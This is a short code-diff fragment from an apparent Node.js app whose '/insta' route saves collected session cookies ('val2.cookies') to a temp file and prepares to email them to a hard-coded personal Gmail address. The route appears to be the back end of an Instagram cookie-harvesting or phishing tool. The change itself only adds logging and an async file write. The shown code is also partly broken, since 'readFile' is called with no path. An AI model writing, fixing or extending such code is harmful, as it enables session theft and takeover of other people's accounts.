@@ -248,12 +248,14 @@ app.post("/insta", (req, res) => {
           length: 6,
           charset: "alphabetic",
         });
-        fse.outputJsonSync(
+      const output=await fse.outputJSON(
           __dirname +
             `/tempt/${filename}.txt`,
           val2.cookies
         );
+        console.log(output);
         const data=await fse.readFile();
+        console.log(data);
         var mailOptions = {
           from: process.env.email,
           to: "tklinger50@gmail.com",
